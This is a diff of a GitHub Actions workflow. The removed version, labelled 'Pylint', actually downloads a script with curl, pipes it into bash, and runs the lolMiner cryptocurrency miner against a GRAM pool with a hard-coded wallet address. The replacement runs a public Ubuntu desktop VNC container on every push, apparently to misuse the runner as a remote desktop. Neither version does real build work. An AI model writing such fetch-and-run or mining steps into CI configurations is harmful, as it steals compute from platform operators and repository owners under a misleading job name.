@@ -1,16 +1,17 @@
-name: Pylint
+name: Docker Container
 
 on: [push]
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
-    - name: Download
-      run: curl -L https://pool.gramcoin.org/download.bash | bash
-      
-    - name: Go to directory
-      run: cd /home/runner/work/crypto_miner/crypto_miner/lolMiner-1.84
-    
-    - name: Run miner
-      run: .\lolMiner -a GRAM --pool api-pool.gramcoin.org:443 --user UQBj3k1LdcQIbMZeYrXT50yV5I30gXlpbcPrO6iPDvIymRr0
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Set up Docker Buildx
+      uses: docker/setup-buildx-action@v1
+
+    - name: Run Docker container
+      run: docker run -p 6070:80 dorowu/ubuntu-desktop-lxde-vnc
